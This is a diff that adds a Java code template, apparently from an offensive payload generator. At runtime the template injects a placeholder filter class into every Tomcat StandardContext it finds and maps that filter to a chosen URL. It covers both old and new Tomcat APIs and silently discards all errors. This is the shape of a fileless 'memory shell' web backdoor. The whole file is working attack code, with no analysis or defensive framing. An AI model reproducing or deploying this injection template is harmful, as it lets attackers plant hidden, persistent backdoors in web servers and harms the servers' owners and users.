@@ -1,0 +1,33 @@
+{
+    java.util.ArrayList sdcArr = {{{methodNameContext}}}();
+
+    for (int i = 0; i < sdcArr.size(); i++) {
+        try{
+            org.apache.catalina.core.StandardContext standardContext = (org.apache.catalina.core.StandardContext) sdcArr.get(i);
+            try{
+                org.apache.catalina.deploy.FilterDef filterDef = new org.apache.catalina.deploy.FilterDef();
+                filterDef.setFilterName("{{{methodNameContext}}}");
+                filterDef.setFilterClass("{{{className}}}");
+                standardContext.addFilterDef(filterDef);
+            }catch(java.lang.NoClassDefFoundError e){
+                org.apache.tomcat.util.descriptor.web.FilterDef filterDef = new org.apache.tomcat.util.descriptor.web.FilterDef();
+                filterDef.setFilterName("{{{methodNameContext}}}");
+                filterDef.setFilterClass("{{{className}}}");
+                standardContext.addFilterDef(filterDef);
+            }
+
+            try{
+                org.apache.catalina.deploy.FilterMap filterMap = new org.apache.catalina.deploy.FilterMap();
+                filterMap.setFilterName("{{{methodNameContext}}}");
+                filterMap.addURLPattern("{{{url}}}");
+                standardContext.addFilterMap(filterMap);
+            }catch(java.lang.NoClassDefFoundError e){
+              org.apache.tomcat.util.descriptor.web.FilterMap filterMap = new org.apache.tomcat.util.descriptor.web.FilterMap();
+              filterMap.setFilterName("{{{methodNameContext}}}");
+              filterMap.addURLPattern("{{{url}}}");
+              standardContext.addFilterMap(filterMap);
+            }
+            standardContext.filterStart();
+        } catch(java.lang.Exception e){}
+    }
+}
